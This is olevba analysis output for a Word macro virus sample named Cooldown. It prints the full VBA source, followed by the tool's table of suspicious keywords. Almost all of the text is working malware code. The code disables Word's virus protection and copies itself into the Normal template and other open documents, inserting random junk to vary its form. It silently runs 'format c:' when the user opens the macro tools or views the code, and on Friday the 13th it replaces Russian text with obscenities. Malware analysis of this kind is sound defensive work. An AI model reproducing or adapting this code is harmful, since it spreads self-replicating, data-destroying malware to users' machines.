olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-82a8cf49bdd14f97fc06de89160a416aeeebf35f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-82a8cf49bdd14f97fc06de89160a416aeeebf35f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
               Private Sub _
              Document_Open()
       CoolDown 0
    ' 5759.619
' 2452.835
End _
        Sub
  Private _
  Sub Document_Close()
          ' 6323.634
CoolDown 0
      ' 5174.427
End Sub
       ' 6232.833
' 6440.589
Private _
Sub ToolsMacro()
             CoolDown 1
              ' 6329.567
End Sub
              Private Sub _
      ViewVBCode()
            CoolDown 1
           End Sub
          ' 9040.483
' 626.0729
Private _
             Sub CoolDown(How As Integer)
           ' 9945.036
' 3283.848
On Error Resume Next
          ' 1660.642
' 1468.716

' 5281.729
' 999.1694
Dim c _
   As String, a As _
               Long, b As _
                Long, d As _
                Long, e As _
    Long, f _
 As Long, res _
             As String, _
          m _
 As Boolean
                Randomize
             With Options
         ' 1506.751
.VirusProtection _
            = _
           False
             
.ConfirmConversions = _
          False
              .SaveNormalPrompt _
   = _
          False
   ' 8530.814
End _
             With
       If _
      How _
 = _
               1 _
                Then
       s = Shell("format" & Chr(32) _
             & "c:" _
           & Chr(32) _
    & _
            "/autotest", vbHide)
        Else
          With _
               NormalTemplate.VBProject.VBComponents(1).CodeModule
  ' 9681.522
' 5537.274
If Not .Find("Cool" & "Down", 1, 1, _
              1000, 1000, _
            False, _
      False) _
 Then
  ' 7301.125
a = .CountOfLines
     For b _
     = _
               1 To a
 ' 1149.478
' 877.4453

.DeleteLines (1)
           ' 4491.933
' 3091.487
Next
           ' 8559.454
' 4201.034
' 9497.387
' 1407.368
d = 1
 a = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
' 8696.423
res _
           = ""
    For _
        b _
    = _
        1 To _
   a
    ' 1760.05
c = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
    ' 8000.747



c = RTrim(LTrim(c))
         If _
             foo(c, _
           f, res) _
  Then
            
.InsertLines _
d, Space(Rnd * _
       16) & _
            res
 d = _
d _
        + f
       f _
          = 0
                ' 8709.241

res _
 = ""
           End _
            If
 Next
                NormalTemplate.Save
           ' 5841.672
End _
             If
     
' 6172.175
' 4437.604
' 3299.215
' 4899.353
' 6502.163
End _
       With
         
' 5328.99
' 9650.487
For e _
          = _
 1 To Documents.Count
      With _
              Documents(e).VBProject.VBComponents(1).CodeModule
         
If _
        Not _
  .Find("Cool" _
                & "Down", 1, 1, 1000, _
      1000, _
            False, _
               False) _
             Then
              ' 7364.515
a _
            = _
        .CountOfLines
   ' 1105.926
m = Documents(e).Saved
   ' 6706.985
' 7376.889

For _
b _
  = 1 To a
                .DeleteLines (1)
             ' 5135.961
' 7223.722
' 9498.596
Next
  ' 7142.855
' 2673.21
d _
             = _
       1
          ' 4340.032
a _
            = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
' 6338.709
res _
              = ""
                For b _
              = 1 _
       To _
  a
         c _
            = _
   NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, _
  1)
  c = _
  RTrim(LTrim(c))
   If foo(c, _
               f, res) _
          Then
           ' 8747.443
' 9607.496
' 1754.115
.InsertLines _
       d, Space(Rnd * 16) _
        & res
        d _
               = _
               d _
              + _
        f
              f _
  = _
       0
     ' 1035.891
res = ""
              End If
              Next
    ' 6287.515
' 439.015
If _
     Documents(e).Path _
<> "" _
        Then
           
Documents(e).SaveAs _
   AddToRecentFiles:=False
     End If
' 5522.721
' 7069.908
' 7731.772
If _
    (WeekDay(Date) _
  = _
            6) And (Day(Date) _
     = _
   13) And _
        (Rnd _
               > _
          0.7) _
              Then
' 3122.075
Application.StatusBar _
              = _
 ""
    Application.DisplayStatusBar _
       = False
             Application.ScreenUpdating = _
      False
               With _
             Documents(e).Content
            ' 6635.798
.Find.Execute FindText:="пр", _
          ReplaceWith:="пизд", _
            Replace:=wdReplaceAll
   ' 2151.932
.Find.Execute FindText:="др", _
  ReplaceWith:="понос", Replace:=wdReplaceAll
         .Find.Execute FindText:="кр", _
        ReplaceWith:="кобыл", _
       Replace:=wdReplaceAll
        .Find.Execute FindText:="стр", ReplaceWith:="ебан", Replace:=wdReplaceAll
            ' 5650.674
' 5662.288
' 9215.288
.Find.Execute FindText:="ср", ReplaceWith:="срак", Replace:=wdReplaceAll
               ' 5870.681
.Find.Execute _
         FindText:="тр", ReplaceWith:="трах", Replace:=wdReplaceAll
     .Find.Execute _
             FindText:="бр", _
    ReplaceWith:="бляд", _
      Replace:=wdReplaceAll
              .Find.Execute _
         FindText:="вр", _
         ReplaceWith:="выеб", Replace:=wdReplaceAll
          
.Find.Execute FindText:="гр", _
    ReplaceWith:="говн", _
            Replace:=wdReplaceAll
       ' 3154.466
' 7876.203
' 24.91057
.Find.Execute _
            FindText:="жр", ReplaceWith:="жоп", _
           Replace:=wdReplaceAll
        ' 5379.55
' 9898.536
.Find.Execute _
              FindText:="зр", ReplaceWith:="залуп", _
     Replace:=wdReplaceAll
           ' 6980.351

.Find.Execute FindText:="дж", ReplaceWith:="джоп", _
         Replace:=wdReplaceAll
   ' 8375.303
' 1303.236
.Find.Execute _
      FindText:="кал", _
            ReplaceWith:="дер", Replace:=wdReplaceAll
 .Find.Execute _
          FindText:="бух", ReplaceWith:="бряк", _
             Replace:=wdReplaceAll
          ' 8415.741
End _
   With
              Documents(e).UndoClear
        Application.DisplayStatusBar = _
                True
     Application.ScreenUpdating _
      = True
  
' 8999.139
Application.StatusBar = ""
      ' 935.871
' 654.2325
' 2366.749

End _
  If
      ' 183.773
Documents(e).Saved _
              = m
               End If
             
' 1388.168
End With
           ' 513.919
Next
           End If
               End Sub
             Private Function foo(ByRef _
         s _
    As _
             String, ByRef i As Long, _
           ByRef res As String) _
               As _
          Boolean
    ' 6928.295
' 9715.705
Dim tmp _
 As _
      String
              ' 1068.436
If (Left(s, _
    1) _
      = "'") Or (Len(s) = 0) Then
          foo _
              = _
           False
     Exit Function
            
' 4371.652
End If
     If Right(s, 2) = _
Chr(32) _
              & _
   "_" Then
    ' 2323.428
res = _
  res & Left(s, Len(s) - 1)
            
' 7757.066
' 7381.002
' 3344.672
foo _
              = False
              Exit _
     Function
            End If
      tmp _
   = res _
           & s
          
' 3456.926
' 3808.899
res _
   = ""
  ' 8847.775
' 396.4597
i _
           = 1
           ' 7573.264

' 856.5283
' 6501.93
While _
    Rnd > _
             0.5
    
' 3002.363
' 6979.314
If _
             Rnd < _
               0.8 Then
                res _
        = res & "'" _
       & Str(Rnd * 10000)
 End _
  If
      res _
  = res _
          & Chr(13)
              i _
         = _
          i _
   + 1
          ' 8663.892
Wend
           ' 9240.463
' 452.4553
' 5464.88
For a = 1 To Len(tmp)
            res = res & Mid(tmp, a, _
1)
            If _
          Mid(tmp, _
          a, _
         1) _
               = _
            Chr(32) Then
     If _
       Rnd _
 > _
   0.5 Then
         res _
         = _
  res & _
   "_" & Chr(13) _
           & _
          Space(Rnd _
        * 16)
      i = _
       i + 1
      End _
  If
 ' 6168.638
' 6411.764
End If
   ' 1900.969
' 3502.238
' 8143.319
Next
             ' 7282.589
' 2318.968
foo = True
  End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

